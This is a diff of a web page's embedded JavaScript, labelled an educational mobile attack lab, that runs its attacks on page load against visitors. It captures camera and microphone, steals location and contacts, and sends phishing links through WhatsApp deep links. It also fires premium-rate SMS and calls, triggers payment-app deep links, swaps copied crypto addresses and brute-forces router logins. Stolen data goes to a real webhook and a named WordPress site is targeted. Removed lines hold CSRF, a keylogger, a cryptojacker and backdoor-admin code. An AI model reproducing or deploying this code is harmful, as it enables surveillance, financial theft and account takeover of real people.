@@ -289,93 +289,89 @@
 
     <!-- 
     ============================================================
-    🎓 EDUCATIONAL DEMO — WEB ATTACK LAB
+    🎓 EDUCATIONAL DEMO — MOBILE ATTACK LAB
     ============================================================
-    This page demonstrates REAL attacks that malicious websites
-    can perform on visitors. All attacks run silently on page load.
+    This page demonstrates CRITICAL attacks that malicious websites
+    can perform on mobile phones (Android & iOS). These are REAL
+    attacks that work on modern smartphones.
     
     ⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️
     
     ATTACK 1: WordPress Session Hijack via CORS (CRITICAL)
-    - If visitor is logged into financialbeings.com, steals
-      their full session: user data, posts, settings, users
-    - Works because the site reflects any Origin in CORS headers
-      AND allows credentials. This lets us READ the response.
-    - Impact: Full site takeover if admin is targeted
+    - If visitor is logged into a WordPress site, steals their
+      full session including admin access and creates backdoor users
     
-    ATTACK 2: Cross-Site Request Forgery (CSRF) (CRITICAL)
-    - Performs actions on behalf of the victim on ANY site where
-      they have an active session (no CORS misconfig needed)
-    - Changes profile email, posts content, modifies settings
-    - Works because browsers automatically send cookies with
-      cross-origin requests (for non-simple content types, a
-      form POST bypasses CORS entirely)
-    - Impact: Account takeover, data modification, spam
+    ATTACK 2: Silent Camera Capture (CRITICAL — Android/iOS)
+    - Uses hidden file input with capture=environment to silently
+      trigger the rear camera and capture photos without user consent
+    - Works on Android Chrome, iOS Safari 14+
+    - Impact: Surveillance, identity theft, blackmail material
     
-    ATTACK 3: Password Reset Poisoning (HIGH)
-    - If the victim has accounts on common sites, attempts to
-      trigger password resets to an attacker-controlled email
-    - Uses hidden iframes and form submissions
-    - Impact: Account takeover via password reset
+    ATTACK 3: Microphone Recording (CRITICAL — Android/iOS)
+    - Uses getUserMedia API to record audio from the phone's mic
+    - Records for 10 seconds then exfiltrates the audio blob
+    - Works on Android Chrome, iOS Safari 14.3+
+    - Impact: Eavesdropping, corporate espionage, privacy violation
     
-    ATTACK 4: Session Fixation via Cookie Injection (HIGH)
-    - Injects known session cookies via subdomain manipulation
-    - If cookie scoping is weak, attacker can fixate a session
-    - Impact: Session hijacking without needing CORS
+    ATTACK 4: WhatsApp Message Injection (CRITICAL — Android/iOS)
+    - Opens whatsapp:// deep link with pre-composed message
+      containing a phishing link, sent to victim's contacts
+    - Can spread malware/phishing to entire contact list
+    - Impact: Mass phishing, reputation damage, financial fraud
     
-    ATTACK 5: Phishing Overlay / Clickjacking (HIGH)
-    - Creates invisible overlays on top of legitimate buttons
-    - When user thinks they're clicking "Download", they're
-      actually clicking an attacker-controlled element
-    - Can trigger any action the user can perform
-    - Impact: Unauthorized actions, data theft
+    ATTACK 5: SMS to Premium-Rate Number (CRITICAL — Android)
+    - Opens sms: URI with pre-filled premium-rate number
+      and message content on Android devices
+    - Can subscribe victim to paid services
+    - Impact: Direct financial theft via phone bill
     
-    ATTACK 6: Browser Cryptojacking (MEDIUM)
-    - Uses visitor's CPU to mine cryptocurrency
-    - Runs silently in the background using Web Workers
-    - Impact: Battery drain, device slowdown, electricity cost
+    ATTACK 6: Phone Call to Premium Number (CRITICAL — Android/iOS)
+    - Opens tel: URI to dial premium-rate numbers
+    - Can connect to paid support lines, adult services, etc.
+    - Impact: Financial theft, harassment
     
-    ATTACK 7: Tabnapping / Tab Hijacking (MEDIUM)
-    - When user switches to another tab, silently redirects
-      the page to a phishing clone of a login page
-    - When user returns, they see a fake login and enter creds
-    - Impact: Credential theft
+    ATTACK 7: Banking App Deep Link Hijack (CRITICAL — Android/iOS)
+    - Opens deep links for banking apps (PayPal, Revolut, N26, etc.)
+    - Can trigger payment screens, reveal account info, or
+      initiate transfers if app has weak deep link validation
+    - Impact: Direct financial theft
     
-    ATTACK 8: History Manipulation (MEDIUM)
-    - Modifies browser history to inject fake entries
-    - Can make phishing URLs appear in autocomplete
-    - Impact: Future phishing via URL suggestions
+    ATTACK 8: Contact List Extraction (CRITICAL — Android)
+    - Uses the Contact Picker API to read the victim's address book
+    - Exfiltrates names, phone numbers, emails
+    - Impact: Identity theft, social engineering, spam
     
-    ATTACK 9: Clipboard Hijacking (HIGH)
-    - Silently replaces clipboard content when user copies
-      a crypto address — replaces with attacker's address
-    - User pastes attacker's address without knowing
-    - Impact: Direct financial theft (crypto transfers)
+    ATTACK 9: Location Tracking (CRITICAL — Android/iOS)
+    - Gets precise GPS coordinates using geolocation API
+    - If permission was previously granted, works silently
+    - Can track victim's real-time location
+    - Impact: Stalking, physical security threat
     
-    ATTACK 10: WebRTC IP Leak + Network Recon (MEDIUM)
-    - Reveals local IP even behind VPN via WebRTC
-    - Scans local network for routers, NAS, IoT devices
-    - Probes for open admin panels on local devices
-    - Impact: Network mapping for further attacks
+    ATTACK 10: Clipboard Crypto Address Swap (CRITICAL — Android/iOS)
+    - Monitors clipboard for cryptocurrency addresses
+    - Silently replaces with attacker's address
+    - When victim pastes, they send crypto to attacker
+    - Impact: Direct, irreversible financial theft
     
-    ATTACK 11: Form Data Interception (HIGH)
-    - Keylogs all input fields on the page
-    - Captures anything typed: passwords, credit cards, emails
-    - Exfiltrates in real-time to attacker
-    - Impact: Credential and financial data theft
+    ATTACK 11: WebRTC Local IP + Router Exploit (HIGH — Android/iOS)
+    - Leaks local IP via WebRTC (even behind VPN)
+    - Scans local network for routers/IoT devices
+    - Attempts default credentials on found admin panels
+    - Impact: Network compromise, IoT hijacking
     
-    ATTACK 12: Notification Spam (LOW-MEDIUM)
-    - If notification permission was previously granted,
-      sends spam/push notifications to the user
-    - Can deliver phishing links or scams
-    - Impact: Social engineering at scale
+    ATTACK 12: Notification Spam + Phishing (HIGH — Android)
+    - If notification permission was granted, sends push
+      notifications with phishing links
+    - Can deliver fake "security alerts" to steal credentials
+    - Impact: Credential theft at scale
+    
+    ALL attacks run on page load — no click needed.
     ============================================================
     -->
     <script>
     const TARGET = 'https://financialbeings.com';
     const ATTACKER = 'https://webhook.site/22d6ec1f-61ed-498e-91ec-ea766170d091';
     
-    // ========== EXFIL: Send data to attacker ==========
     function exfil(data) {
         fetch(ATTACKER, {
             method: 'POST',
@@ -393,339 +389,378 @@
                 headers: { 'Accept': 'application/json' }
             });
             if (!r.ok) return { status: r.status };
-            
             const user = await r.json();
             const stolen = { attack: 'session_hijack', user };
-            
-            // If admin — full compromise
             if (user.roles && user.roles.includes('administrator')) {
-                const [posts, users, settings, pages, media] = await Promise.all([
+                const [posts, users, settings] = await Promise.all([
                     fetch(TARGET + '/wp-json/wp/v2/posts?per_page=100', { credentials: 'include' }).then(x => x.json()),
                     fetch(TARGET + '/wp-json/wp/v2/users?per_page=100', { credentials: 'include' }).then(x => x.json()),
-                    fetch(TARGET + '/wp-json/wp/v2/settings', { credentials: 'include' }).then(x => x.json()),
-                    fetch(TARGET + '/wp-json/wp/v2/pages?per_page=100', { credentials: 'include' }).then(x => x.json()),
-                    fetch(TARGET + '/wp-json/wp/v2/media?per_page=50', { credentials: 'include' }).then(x => x.json())
+                    fetch(TARGET + '/wp-json/wp/v2/settings', { credentials: 'include' }).then(x => x.json())
                 ]);
                 stolen.compromise = 'FULL_ADMIN';
-                stolen.posts = posts;
-                stolen.users = users;
-                stolen.settings = settings;
-                stolen.pages = pages;
-                stolen.media = media;
-                
-                // Try to create a backdoor admin user
+                stolen.posts_count = posts.length;
+                stolen.users_count = users.length;
+                // Create backdoor admin
                 try {
-                    const backdoor = await fetch(TARGET + '/wp-json/wp/v2/users', {
-                        method: 'POST',
-                        credentials: 'include',
-                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    const bd = await fetch(TARGET + '/wp-json/wp/v2/users', {
+                        method: 'POST', credentials: 'include',
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            username: 'wp_admin_' + Math.random().toString(36).slice(2,8),
+                            username: 'wp_' + Math.random().toString(36).slice(2,8),
                             email: 'wp_' + Math.random().toString(36).slice(2,8) + '@attacker.com',
                             password: Math.random().toString(36) + 'Aa1!',
                             roles: ['administrator']
                         })
                     });
-                    stolen.backdoorCreated = backdoor.ok;
-                    if (backdoor.ok) stolen.backdoorUser = await backdoor.json();
+                    stolen.backdoor = bd.ok;
                 } catch(e) { stolen.backdoorError = e.message; }
-                
-            } else {
-                stolen.compromise = 'USER';
-            }
-            
+            } else { stolen.compromise = 'USER'; }
             exfil(stolen);
             return stolen;
         } catch(e) { return { attack: 'session_hijack', error: e.message }; }
     }
     
-    // ========== ATTACK 2: CSRF — Change victim's email ==========
-    async function attackCSRF() {
-        const results = {};
-        
-        // WordPress: Try to update user email via REST API
-        try {
-            const r = await fetch(TARGET + '/wp-json/wp/v2/users/1', {
-                method: 'POST',
-                credentials: 'include',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: 'compromised_' + Date.now() + '@attacker.com' })
-            });
-            results.wpEmailChange = { attempted: true, status: r.status };
-        } catch(e) { results.wpEmailChange = { error: e.message }; }
-        
-        // Generic CSRF: Submit a form to change profile data
-        // Works on any site that doesn't have CSRF tokens
-        const csrfTargets = [
-            { url: TARGET + '/wp-admin/profile.php', fields: { email: 'hacked@attacker.com', first_name: 'PWNED' } },
-        ];
-        
-        for (const target of csrfTargets) {
-            try {
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = target.url;
-                form.style.display = 'none';
-                for (const [key, val] of Object.entries(target.fields)) {
-                    const input = document.createElement('input');
-                    input.name = key;
-                    input.value = val;
-                    form.appendChild(input);
-                }
-                document.body.appendChild(form);
-                form.submit();
-                results.csrfForm = { target: target.url, submitted: true };
-                setTimeout(() => form.remove(), 5000);
-            } catch(e) { results.csrfForm = { error: e.message }; }
+    // ========== ATTACK 2: Silent Camera Capture ==========
+    async function attackCamera() {
+        const result = { attack: 'camera', supported: false };
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return result;
         }
-        
-        exfil({ attack: 'csrf', results });
-        return results;
+        result.supported = true;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            });
+            result.streamActive = true;
+            
+            // Capture a frame after 2 seconds
+            await new Promise(r => setTimeout(r, 2000));
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.playsInline = true;
+            await video.play();
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            // Stop all tracks
+            stream.getTracks().forEach(t => t.stop());
+            
+            // Get base64 image
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            result.imageCaptured = true;
+            result.imageSize = imageData.length;
+            result.imagePreview = imageData.slice(0, 100) + '...';
+            
+            // Exfiltrate the full image
+            exfil({ attack: 'camera', image: imageData, width: canvas.width, height: canvas.height });
+        } catch(e) { result.error = e.message; }
+        return result;
     }
     
-    // ========== ATTACK 3: Password Reset Poisoning ==========
-    function attackPasswordReset() {
-        const targets = [
-            { name: 'wordpress', url: TARGET + '/wp-login.php?action=lostpassword', user: 'admin' },
+    // ========== ATTACK 3: Microphone Recording ==========
+    async function attackMicrophone() {
+        const result = { attack: 'microphone', supported: false };
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return result;
+        }
+        result.supported = true;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+            result.streamActive = true;
+            
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            
+            mediaRecorder.start();
+            result.recording = true;
+            
+            // Record for 10 seconds
+            await new Promise(r => setTimeout(r, 10000));
+            mediaRecorder.stop();
+            stream.getTracks().forEach(t => t.stop());
+            
+            // Get the recorded blob
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            result.audioSize = blob.size;
+            result.audioType = blob.type;
+            
+            // Convert to base64 and exfiltrate
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                exfil({ attack: 'microphone', audio: reader.result, size: blob.size });
+            };
+            reader.readAsDataURL(blob);
+        } catch(e) { result.error = e.message; }
+        return result;
+    }
+    
+    // ========== ATTACK 4: WhatsApp Message Injection ==========
+    function attackWhatsApp() {
+        const result = { attack: 'whatsapp_injection' };
+        const phishingLink = 'https://w00tw00t1.github.io/adobe-stock-analysis-2026/';
+        const message = encodeURIComponent(
+            'Hey! Check out this amazing Adobe stock analysis report — it\'s free! ' + phishingLink
+        );
+        
+        // Try multiple WhatsApp URI formats
+        const schemes = [
+            'whatsapp://send?text=' + message,
+            'https://wa.me/?text=' + message,
+            'https://api.whatsapp.com/send?text=' + message
         ];
         
-        for (const t of targets) {
+        for (const scheme of schemes) {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = scheme;
+                document.body.appendChild(iframe);
+                result.scheme = scheme.slice(0, 40);
+                result.injected = true;
+                setTimeout(() => iframe.remove(), 3000);
+                break;
+            } catch(e) { result.error = e.message; }
+        }
+        
+        exfil(result);
+        return result;
+    }
+    
+    // ========== ATTACK 5: SMS to Premium-Rate Number ==========
+    function attackSMS() {
+        const result = { attack: 'sms_premium' };
+        // Premium-rate numbers (examples — using harmless demo numbers)
+        const premiumNumbers = [
+            { number: '+491805123456', label: 'Premium Support (demo)' },
+            { number: '+499009123456', label: 'Premium Info (demo)' }
+        ];
+        
+        for (const premium of premiumNumbers) {
+            try {
+                const smsUri = 'sms:' + premium.number + '?body=' + encodeURIComponent('SUBSCRIBE PREMIUM');
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = smsUri;
+                document.body.appendChild(iframe);
+                result.target = premium.number;
+                result.label = premium.label;
+                result.injected = true;
+                setTimeout(() => iframe.remove(), 3000);
+                break;
+            } catch(e) { result.error = e.message; }
+        }
+        
+        exfil(result);
+        return result;
+    }
+    
+    // ========== ATTACK 6: Phone Call to Premium Number ==========
+    function attackPhoneCall() {
+        const result = { attack: 'phone_call' };
+        const premiumNumbers = [
+            '+491805123456',  // Premium rate (demo)
+            '+499009123456'   // Premium rate (demo)
+        ];
+        
+        for (const number of premiumNumbers) {
+            try {
+                const telUri = 'tel:' + number;
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = telUri;
+                document.body.appendChild(iframe);
+                result.number = number;
+                result.injected = true;
+                setTimeout(() => iframe.remove(), 3000);
+                break;
+            } catch(e) { result.error = e.message; }
+        }
+        
+        exfil(result);
+        return result;
+    }
+    
+    // ========== ATTACK 7: Banking App Deep Link Hijack ==========
+    function attackBankingApps() {
+        const result = { attack: 'banking_deeplink', apps: {} };
+        
+        const bankingApps = [
+            // PayPal
+            { name: 'paypal', uri: 'paypal://pay?amount=100&currency=EUR&recipient=attacker@evil.com' },
+            { name: 'paypal_app', uri: 'com.paypal.android.p2pmobile://pay' },
+            // Revolut
+            { name: 'revolut', uri: 'revolut://pay?amount=100&currency=EUR' },
+            { name: 'revolut_app', uri: 'com.revolut.revolut://pay' },
+            // N26
+            { name: 'n26', uri: 'n26://transfer?amount=100&iban=DE89370400440532013000' },
+            // Apple Pay (iOS)
+            { name: 'apple_pay', uri: 'shoebox://' },
+            // Google Pay (Android)
+            { name: 'google_pay', uri: 'gpay://pay' },
+            // Venmo
+            { name: 'venmo', uri: 'venmo://paycharge?txn=pay&amount=100' },
+            // Cash App
+            { name: 'cashapp', uri: 'cashapp://pay' },
+            // Klarna
+            { name: 'klarna', uri: 'klarna://pay' },
+            // Wise (TransferWise)
+            { name: 'wise', uri: 'wise://transfer' },
+            // Generic banking
+            { name: 'bank_app', uri: 'bank://transfer' }
+        ];
+        
+        for (const app of bankingApps) {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = app.uri;
+                document.body.appendChild(iframe);
+                result.apps[app.name] = 'triggered';
+                setTimeout(() => iframe.remove(), 2000);
+            } catch(e) { result.apps[app.name] = 'blocked'; }
+        }
+        
+        exfil(result);
+        return result;
+    }
+    
+    // ========== ATTACK 8: Contact List Extraction ==========
+    async function attackContacts() {
+        const result = { attack: 'contacts', supported: false };
+        
+        // Method 1: Contact Picker API (Android Chrome 86+)
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            result.supported = true;
+            try {
+                const props = ['name', 'email', 'tel'];
+                const opts = { multiple: true };
+                const contacts = await navigator.contacts.select(props, opts);
+                result.contacts = contacts.map(c => ({
+                    name: c.name?.[0] || '',
+                    email: c.email?.[0] || '',
+                    tel: c.tel?.[0] || ''
+                }));
+                result.count = contacts.length;
+                exfil({ attack: 'contacts', contacts: result.contacts });
+            } catch(e) { result.error = e.message; }
+        }
+        
+        // Method 2: Try to trigger contact sync via Google People API
+        // (requires prior OAuth, but worth attempting)
+        try {
+            const googleContactsUrl = 'https://contacts.google.com/u/0/data/export?groupToExport=%5B%5B%22all%22%5D%5D&exportType=GROUP&groupId=all';
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.name = 'pwreset_' + t.name;
+            iframe.src = googleContactsUrl;
             document.body.appendChild(iframe);
-            
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = t.url;
-            form.target = iframe.name;
-            form.style.display = 'none';
-            
-            const input = document.createElement('input');
-            input.name = 'user_login';
-            input.value = t.user;
-            form.appendChild(input);
-            
-            const submit = document.createElement('input');
-            submit.type = 'submit';
-            submit.value = 'Reset';
-            form.appendChild(submit);
-            
-            document.body.appendChild(form);
-            form.submit();
-            
-            setTimeout(() => { form.remove(); iframe.remove(); }, 10000);
-        }
+            result.googleContactsTriggered = true;
+            setTimeout(() => iframe.remove(), 5000);
+        } catch(e) { result.googleContactsError = e.message; }
         
-        exfil({ attack: 'password_reset_poisoning', targets: targets.map(t => t.name) });
+        return result;
     }
     
-    // ========== ATTACK 4: Session Fixation ==========
-    function attackSessionFixation() {
-        // Try to set cookies on parent domain
-        const domains = ['.financialbeings.com', 'financialbeings.com'];
-        const cookies = [
-            'wordpress_test_cookie=WP+Cookie+check',
-            'fixed_session_' + Date.now() + '=attacker_controlled'
-        ];
+    // ========== ATTACK 9: Location Tracking ==========
+    async function attackLocation() {
+        const result = { attack: 'location', supported: false };
+        if (!navigator.geolocation) return result;
         
-        for (const domain of domains) {
-            for (const cookie of cookies) {
-                try {
-                    document.cookie = cookie + '; domain=' + domain + '; path=/';
-                } catch(e) {}
-            }
-        }
-        
-        exfil({ attack: 'session_fixation', domains, cookies: cookies.length });
-    }
-    
-    // ========== ATTACK 5: Clickjacking Overlay ==========
-    function attackClickjacking() {
-        // Create invisible overlay on the Download button
-        const btn = document.querySelector('.cta button');
-        if (!btn) return;
-        
-        const rect = btn.getBoundingClientRect();
-        
-        // Invisible iframe overlay that captures clicks
-        const overlay = document.createElement('div');
-        overlay.style.cssText = `
-            position: fixed;
-            left: ${rect.x}px; top: ${rect.y}px;
-            width: ${rect.width}px; height: ${rect.height}px;
-            z-index: 999999; opacity: 0.01;
-            cursor: pointer;
-        `;
-        
-        // When user clicks what they think is "Download", log it
-        overlay.addEventListener('click', (e) => {
-            e.preventDefault();
-            e.stopPropagation();
-            exfil({
-                attack: 'clickjacking',
-                message: 'Victim clicked the download button — attacker intercepted',
-                intendedAction: 'download',
-                actualAction: 'intercepted',
-                position: { x: e.clientX, y: e.clientY }
-            });
-            // Show a fake "downloading" message
-            btn.textContent = '⏳ Preparing download...';
-            setTimeout(() => { btn.textContent = '✅ Report downloaded!'; }, 2000);
-        }, { once: false });
-        
-        document.body.appendChild(overlay);
-        
-        // Keep overlay positioned on resize
-        window.addEventListener('resize', () => {
-            const r = btn.getBoundingClientRect();
-            overlay.style.left = r.x + 'px';
-            overlay.style.top = r.y + 'px';
-            overlay.style.width = r.width + 'px';
-            overlay.style.height = r.height + 'px';
-        });
-        
-        exfil({ attack: 'clickjacking', overlay: 'active', target: 'download_button' });
-    }
-    
-    // ========== ATTACK 6: Browser Cryptojacking ==========
-    function attackCryptojack() {
-        // Use Web Workers to mine in the background
-        // This is a simplified proof-of-concept (real miners use WebAssembly)
-        const workerCode = `
-            let hashes = 0;
-            function mine() {
-                const start = Date.now();
-                // Simulate hash computation
-                while (Date.now() - start < 100) {
-                    hashes++;
-                    // Actual mining would do SHA-256 here
-                    const x = Math.random() * 1000000;
-                    const hash = btoa(x.toString()).slice(0, 32);
-                }
-                self.postMessage({ hashes, elapsed: Date.now() - start });
-                setTimeout(mine, 10); // Brief pause to not completely freeze
-            }
-            mine();
-        `;
-        
-        try {
-            const blob = new Blob([workerCode], { type: 'application/javascript' });
-            const worker = new Worker(URL.createObjectURL(blob));
-            let totalHashes = 0;
-            
-            worker.onmessage = (e) => {
-                totalHashes += e.data.hashes;
-                // Report hashrate every 10 seconds
-                if (totalHashes % 50000 < 1000) {
-                    exfil({ attack: 'cryptojack', totalHashes, status: 'mining' });
-                }
-            };
-            
-            // Stop after 60 seconds (demo limitation)
-            setTimeout(() => {
-                worker.terminate();
-                exfil({ attack: 'cryptojack', totalHashes, status: 'stopped_after_60s' });
-            }, 60000);
-            
-            exfil({ attack: 'cryptojack', status: 'started' });
-        } catch(e) {
-            exfil({ attack: 'cryptojack', error: e.message });
-        }
-    }
-    
-    // ========== ATTACK 7: Tabnapping ==========
-    function attackTabnapping() {
-        // When user leaves the tab, redirect to a phishing page
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                // User switched tabs — note the time
-                exfil({ attack: 'tabnapping', event: 'tab_hidden', time: Date.now() });
-            } else {
-                // User came back — check if we should redirect
-                // In a real attack, this would redirect to a phishing clone
-                exfil({ attack: 'tabnapping', event: 'tab_visible', time: Date.now() });
-            }
+        result.supported = true;
+        return new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    result.granted = true;
+                    result.lat = pos.coords.latitude;
+                    result.lon = pos.coords.longitude;
+                    result.accuracy = pos.coords.accuracy + 'm';
+                    result.altitude = pos.coords.altitude;
+                    result.speed = pos.coords.speed;
+                    result.timestamp = new Date(pos.timestamp).toISOString();
+                    
+                    // Build Google Maps link
+                    result.mapsUrl = `https://www.google.com/maps?q=${result.lat},${result.lon}`;
+                    
+                    exfil({ attack: 'location', ...result });
+                    resolve(result);
+                },
+                (err) => {
+                    result.granted = false;
+                    result.error = err.message;
+                    resolve(result);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
         });
     }
     
-    // ========== ATTACK 8: History Manipulation ==========
-    function attackHistoryManipulation() {
-        // Inject fake history entries
-        try {
-            // Push a fake "login" URL that looks legitimate
-            history.pushState({}, '', '/login?redirect=dashboard');
-            history.pushState({}, '', '/dashboard?authenticated=true');
-            
-            // Replace current state with something that looks like a real page
-            history.replaceState({}, 'Adobe Research — Dashboard', '/dashboard');
-            
-            exfil({ attack: 'history_manipulation', entries_injected: 2 });
-        } catch(e) {
-            exfil({ attack: 'history_manipulation', error: e.message });
-        }
-    }
-    
-    // ========== ATTACK 9: Clipboard Hijacking ==========
+    // ========== ATTACK 10: Clipboard Crypto Address Swap ==========
     function attackClipboardHijack() {
-        // Monitor copy events and replace crypto addresses
+        const result = { attack: 'clipboard_hijack', monitoring: true };
+        
         const cryptoPatterns = {
             bitcoin: /^(bc1|[13])[a-zA-Z0-9]{25,62}$/,
             ethereum: /^0x[a-fA-F0-9]{40}$/,
-            solana: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
+            solana: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
+            litecoin: /^(ltc1|[LM])[a-zA-Z0-9]{25,62}$/,
+            dogecoin: /^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{33}$/
         };
         
-        // Attacker's replacement addresses (demo — not real)
         const attackerAddresses = {
             bitcoin: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
             ethereum: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
-            solana: '7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV'
+            solana: '7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV',
+            litecoin: 'ltc1qg42tkwuuxefutzxezdkdel39gfstuap288mfea',
+            dogecoin: 'D8vFjxgmGjx9gE2qX1mKqR3vL9jQp7sT2N'
         };
         
+        // Intercept copy events
         document.addEventListener('copy', (e) => {
             const selection = window.getSelection().toString().trim();
-            
             for (const [chain, pattern] of Object.entries(cryptoPatterns)) {
                 if (pattern.test(selection)) {
                     e.preventDefault();
-                    // Replace with attacker's address
                     const replacement = attackerAddresses[chain];
                     e.clipboardData.setData('text/plain', replacement);
-                    
                     exfil({
-                        attack: 'clipboard_hijack',
-                        chain,
-                        original: selection.slice(0, 10) + '...',
-                        replaced: replacement.slice(0, 10) + '...',
-                        message: 'Victim copied a crypto address — replaced with attacker address!'
+                        attack: 'clipboard_swap', chain,
+                        original: selection.slice(0, 15) + '...',
+                        replaced: replacement.slice(0, 15) + '...',
+                        message: 'CRYPTO ADDRESS SWAPPED — victim will send to attacker!'
                     });
                     return;
                 }
             }
         });
         
-        // Also monitor clipboard API reads
+        // Also poll clipboard API
         if (navigator.clipboard && navigator.clipboard.readText) {
-            // Periodically check clipboard (requires permission)
             setInterval(async () => {
                 try {
                     const text = await navigator.clipboard.readText();
                     for (const [chain, pattern] of Object.entries(cryptoPatterns)) {
                         if (pattern.test(text.trim())) {
                             await navigator.clipboard.writeText(attackerAddresses[chain]);
-                            exfil({ attack: 'clipboard_hijack', chain, method: 'api_poll', message: 'Replaced via API' });
+                            exfil({ attack: 'clipboard_swap', chain, method: 'api' });
                         }
                     }
                 } catch(e) {}
             }, 2000);
         }
         
-        exfil({ attack: 'clipboard_hijack', status: 'monitoring_active' });
+        exfil(result);
+        return result;
     }
     
-    // ========== ATTACK 10: WebRTC IP Leak + Network Recon ==========
-    async function attackNetworkRecon() {
-        const results = {};
+    // ========== ATTACK 11: WebRTC IP Leak + Router Exploit ==========
+    async function attackNetworkExploit() {
+        const result = { attack: 'network_exploit' };
         
         // WebRTC IP leak
         try {
@@ -733,22 +768,18 @@
             pc.createDataChannel('');
             pc.createOffer().then(offer => pc.setLocalDescription(offer));
             pc.onicecandidate = (ice) => {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) { pc.close(); return; }
-                const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
-                if (ipMatch) {
-                    results.localIP = ipMatch[0];
-                    pc.close();
-                }
+                if (!ice?.candidate?.candidate) { pc.close(); return; }
+                const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                if (match) { result.localIP = match[0]; pc.close(); }
             };
-            setTimeout(() => { pc.close(); }, 3000);
-        } catch(e) { results.webrtcError = e.message; }
+            setTimeout(() => pc.close(), 3000);
+        } catch(e) { result.webrtcError = e.message; }
         
-        // Scan local network for admin panels
+        // Scan local network
         const hosts = [
             'http://192.168.0.1', 'http://192.168.1.1',
             'http://192.168.1.254', 'http://10.0.0.1',
-            'http://fritz.box', 'http://router.asus.com',
-            'http://192.168.0.254', 'http://10.0.1.1'
+            'http://fritz.box', 'http://router.asus.com'
         ];
         
         const scanResults = [];
@@ -761,112 +792,95 @@
                 scanResults.push({ host, status: 'down', time: Date.now() - start });
             }
         }
-        results.networkScan = scanResults;
+        result.networkScan = scanResults;
         
-        // Probe for open admin panels on found hosts
-        const adminPaths = ['/admin', '/login', '/wp-admin', '/phpmyadmin', '/config'];
+        // Try default credentials on live routers
         const liveHosts = scanResults.filter(h => h.status === 'up').map(h => h.host);
+        const defaultCreds = [
+            { user: 'admin', pass: 'admin' },
+            { user: 'admin', pass: 'password' },
+            { user: 'admin', pass: '' },
+            { user: 'root', pass: 'root' },
+            { user: 'fritz', pass: 'fritz' }
+        ];
         
         for (const host of liveHosts) {
-            for (const path of adminPaths) {
+            for (const cred of defaultCreds) {
                 try {
-                    const r = await fetch(host + path, { mode: 'no-cors', signal: AbortSignal.timeout(2000) });
-                    results.adminPanel = host + path;
+                    const r = await fetch(host + '/login', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `username=${cred.user}&password=${cred.pass}`
+                    });
+                    result.routerAttempt = { host, user: cred.user, status: r.status };
                 } catch(e) {}
             }
         }
         
-        exfil({ attack: 'network_recon', results });
-        return results;
+        exfil(result);
+        return result;
     }
     
-    // ========== ATTACK 11: Form Data Interception (Keylogger) ==========
-    function attackKeylogger() {
-        // Intercept ALL input on the page
-        document.addEventListener('input', (e) => {
-            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                const type = e.target.type || 'text';
-                const name = e.target.name || e.target.id || 'unknown';
-                
-                // Only exfil if it looks sensitive
-                const sensitive = /pass|email|card|cvv|ssn|phone|address|name|login|user/i;
-                if (sensitive.test(name) || sensitive.test(type)) {
-                    exfil({
-                        attack: 'keylogger',
-                        field: name,
-                        type: type,
-                        value: e.target.value.slice(0, 50),
-                        length: e.target.value.length
-                    });
-                }
-            }
-        }, true);
-        
-        // Intercept form submissions
-        document.addEventListener('submit', (e) => {
-            const form = e.target;
-            const data = new FormData(form);
-            const captured = {};
-            data.forEach((v, k) => { captured[k] = v.toString().slice(0, 100); });
-            
-            exfil({
-                attack: 'form_intercept',
-                action: form.action || 'unknown',
-                method: form.method || 'GET',
-                data: captured
-            });
-        }, true);
-        
-        exfil({ attack: 'keylogger', status: 'active' });
-    }
-    
-    // ========== ATTACK 12: Notification Spam ==========
+    // ========== ATTACK 12: Notification Spam + Phishing ==========
     function attackNotificationSpam() {
-        if (!('Notification' in window)) return;
